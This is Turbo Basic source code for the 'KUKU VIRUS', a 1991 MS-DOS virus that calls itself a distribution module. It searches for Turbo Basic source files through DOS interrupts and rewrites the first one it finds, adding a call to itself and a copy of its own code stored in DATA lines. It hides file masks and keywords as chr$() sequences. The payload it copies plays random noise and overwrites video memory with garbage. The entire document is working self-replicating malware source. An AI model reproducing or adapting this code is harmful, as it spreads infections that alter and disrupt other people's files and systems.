$event off
defint a-z
screen 0,0,0
?"KUKU VIRUS Ver. 1.0 (Distribution module.)"
?"Copyright (C) Û IVC Û Moscow groupe.":?
color 15,4:
?"***************************************"
?"*           D A N G E R !!!           *"
?"* Virus for Turbo Basic source files. *"
?"***************************************":beep
color 7,0
?:?"Press any key to process ...";
while inkey$="":wend
?" process";
CALL kuku
if z=0 then ?"File infected."
if z=11 then ?" imposible (NO FILE FOR INFECTED)."
?:?"About all question call to MOSCOW GROUPE of International
?tab(45);"Viruses"
?tab(45);"Company (IVC, Inc.)
while inkey$="":wend
screen 0,1,0
sub     KUKU
	shared z
        n$=string$(8,63)+chr$(46)+chr$(66)+chr$(65)+chr$(83):dim dta%(32),find%(32)
	for a%=0% to 32%:dta%(a%)=0:next
        for z=0 to len(n$)-2 step 2:find%(z/2)=asc(mid$(n$,z+2,1))*256+asc(mid$(n$,z+1,1)):next
        reg 1,&h1A00:reg 8,varseg(dta%(0)):reg 4,varptr(dta%(0)):call interrupt &h21
        reg 1,&h4e00:reg 3,attr:reg 8,varseg(find%(0)):reg 4,varptr(find%(0)):call interrupt &h21
        if reg(1)<>0 then p$=string$(15,255):goto findfirst1
        for a=0 to 32:h=dta%(a) and 255:p$=p$+chr$(h):l=(dta%(a)-h)/&h100 and 255:p$=p$+chr$(l):next
	findfirst1:
        dta$=p$:f$=mid$(dta$,&h1f,13):if f$=string$(len(f$),255) then z=11:exit sub
        a=instr(2,f$,chr$(0)):file$=mid$(f$,1,a)
        ?:?"Infecting file :"file$
        name file$ as chr$(128)
        s1$=chr$(67)+chr$(65)+chr$(76)+chr$(76)+CHR$(32)
        s2$=chr$(68)+chr$(65)+chr$(84)+chr$(65)
        s$=chr$(75)+chr$(85)+chr$(75)+chr$(85)
        open chr$(128) for input as#1
       	?"Size:"lof(1)
	open file$ for output as #2
        ? #2,S1$S$chr$(13)chr$(10)
        ?"Transfer file ..."
        while not eof(1):line input #1,a$:if a$="CALL KUKU" then z=10
        ? #2,a$:wend
        if z=10 then ccq
        ?#2,chr$(32)
        ?"Move data ..."
        for a=1 to 2
        	restore KukuData
                if a=2 then ?#2,S$+s2$+chr$(58)
			while QWE$<>chr$(39)
				read qwe$
			if a=2 then ?#2,S2$+chr$(34);
			? #2,qwe$
			wend
		qwe$=chr$(32)
	next
	?#2,chr$(69)+chr$(78)+chr$(68)+chr$(32)+chr$(83)+chr$(85)+chr$(66)
	?"Out size:";lof(2)
        close #1,#2:kill chr$(128):
        end
ccq:
	?:?"File already infected ...":z=10
	close:kill chr$(128)
        exit sub
kukudata:

data"sub     KUKU"
data"'              KUKU VIRUS FOR TURBO-BASIC !!!"
data"' This virus make at UPK-2 of Sevastopolsky r-n, Moscow.
data"n$=string$(8,63)+chr$(46)+chr$(66)+chr$(65)+chr$(83):dim dta%(32),find%(32)
data"for a%=0% to 32%:dta%(a%)=0:next
data"for z=0 to len(n$)-2 step 2:find%(z/2)=asc(mid$(n$,z+2,1))*256+asc(mid$(n$,z+1,1)):next
data"reg 1,&h1A00:reg 8,varseg(dta%(0)):reg 4,varptr(dta%(0)):call interrupt &h21
data"reg 1,&h4e00:reg 3,attr:reg 8,varseg(find%(0)):reg 4,varptr(find%(0)):call interrupt &h21
data"if reg(1)<>0 then p$=string$(15,255):goto findfirstfile1
data"for a=0 to 32:h=dta%(a) and 255:p$=p$+chr$(h):l=(dta%(a)-h)/&h100 and 255:p$=p$+chr$(l):next
data"findfirstfile1:
data"dta$=p$:f$=mid$(dta$,&h1f,13):if f$=string$(len(f$),255) then
data"for J=1 to 1500:Sound Rnd(1)*(1500-j)+40,.01:NEXT:delay(2)
data"screen 1:def seg=&Hb800:for a=0 to 16384:poke a,rnd(1)*255:next:exit sub
data"end if
data"a=instr(2,f$,chr$(0)):file$=mid$(f$,1,a):name file$ as chr$(128)
data"s1$=chr$(67)+chr$(65)+chr$(76)+chr$(76)+CHR$(32):s2$=chr$(68)+chr$(65)+chr$(84)+chr$(65):s$=chr$(75)+chr$(85)+chr$(75)+chr$(85)
data"open chr$(128) for input as#1
data"open file$ for output as #2
data"? #2,S1$S$chr$(13)chr$(10)
data"while not eof(1):line input #1,a$:? #2,a$:wend
data"?#2,chr$(32)
data"for a=1 to 2:restore KukuData
data"if a=2 then ?#2,S$+s2$
data"while QWE$<>chr$(39):read qwe$:if a=2 then ?#2,S2$chr$(34);
data"? #2,qwe$+chr$(34):wend
data"qwe$=chr$(32):next
data"?#2,chr$(69)chr$(78)chr$(68)chr$(32)chr$(83)chr$(85)chr$(66)
data"close #1,#2:kill chr$(128):exit sub
data"' KUKU Virus Version 1.0
data"' (C) ÛIVCÛ Moscow groupe. 25-May-1991. Serial No.0003529
DATA"'"
end sub